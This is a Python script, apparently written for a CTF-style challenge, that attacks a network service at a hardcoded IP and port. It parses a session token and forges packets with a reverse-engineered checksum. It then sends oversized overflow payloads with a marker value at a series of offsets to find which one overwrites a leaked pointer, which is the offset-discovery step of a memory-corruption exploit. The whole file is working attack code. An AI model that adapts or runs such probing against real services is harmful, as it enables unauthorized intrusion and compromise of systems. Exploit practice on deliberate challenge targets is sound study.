#!/usr/bin/env python3
import socket, struct, re, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37082
C = 0x5A5A5A5A41414141
MARK = 0x1122334455667788


def rd(s, t=2.0):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def try_off(off):
    s = socket.create_connection((HOST, PORT), timeout=8)
    banner = rd(s, 2.0)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    token = int(m.group(1), 16)
    tok12 = (token & 0xFFFFFFFF) << 12

    def pkt(ptype, payload, t=2.0):
        send_packet(s, ptype, payload, token)
        return rd(s, t)

    pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))
    pkt(3, struct.pack("<H", 1) + b"A")
    pkt(4, b"\x00\x00\x00")
    r = pkt(4, b"D")
    m = re.search(rb"0x([0-9a-f]+)", r)
    fp1 = ((int(m.group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF) if m else None

    rlen = 0x100
    ov = bytearray(rlen)
    if off + 8 <= rlen:
        struct.pack_into("<Q", ov, off, MARK)
    rsp = pkt(3, struct.pack("<H", rlen) + bytes(ov))
    r = pkt(4, b"D")
    m = re.search(rb"0x([0-9a-f]+)", r)
    fp2 = ((int(m.group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF) if m else None
    s.close()
    hit = fp2 == MARK
    print(f"off={hex(off):6s} fp1={hex(fp1) if fp1 else None} fp2={hex(fp2) if fp2 else None} HIT={hit} upd={rsp[:80]!r}")
    return hit


if __name__ == "__main__":
    offs = [0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0]
    for off in offs:
        try:
            if try_off(off):
                print("FOUND", hex(off))
                break
        except Exception as e:
            print(f"off={hex(off)} ERR {e}")
